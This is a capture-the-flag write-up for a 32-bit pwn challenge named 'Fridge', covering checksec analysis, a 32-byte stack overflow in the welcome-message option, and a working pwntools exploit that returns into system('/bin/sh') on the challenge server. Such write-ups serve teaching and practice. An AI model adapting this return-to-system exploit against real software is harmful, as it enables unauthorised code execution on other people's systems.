#### Fridge
- points earned: 100

#### Where's the flag?
- flag is located at `/flag.txt`

#### Solution
- this was a standard buffer overflow
- use checksec to investigate binary
	```bash
	kno@kBox ~/lab/CTF/0xFUN_ctf_2026/pwn/fridge$ checksec --file=./vuln                                                           
	[*] '/home/kno/lab/CTF/0xFUN_ctf_2026/pwn/fridge/vuln'  
	   Arch:       i386-32-little  
	   RELRO:      Partial RELRO  
	   Stack:      No canary found  
	   NX:         NX enabled  
	   PIE:        No PIE (0x8048000)  
	   Stripped:   No
	
	```
	- no PIE so addresses will be hardcoded
	- No Canary so I'm probably looking for a buffer overflow
	- 32bit ... old school, so in my exploit arguments to functions are placed on the stack rather then in the registers
- I located the point of buffer overflow just by running the progam and testing inputs.  It's in option 2 `Set fridge welcome message`
- I used ghidra to disas the binary and get a feel for the memory layout
	- I am overflowing a 32  byte buffer
- Solved with `pwntools`
	```python
	from pwn import *
	
	elf = ELF('./vuln')
	system = elf.sym['system']
	binsh = next(elf.search('/bin/sh'))
	print(f'{hex(system)=}')
	print(f'{hex(binsh)=}')
	
	# gdbscript = '\n'.join([ 'b *set_welcome_message+156' ])
	# p = gdb.debug('./vuln', gdbscript=gdbscript)
	p = remote('chall.0xfun.org', 45247)
	
	p.recvuntil(b'> ')
	p.sendline(b'2')
	p.recvuntil(b'New welcome message (up to 32 chars):\n')
	
	offset = 32 + 8 + 8
	ret = 0xAABBCCDD
	cmd = b'cat /flag.txt\x00'
	
	payload = b'A'*offset + p32(system) + p32(ret) + p32(binsh)
	p.sendline(payload)
	
	p.interactive()
	```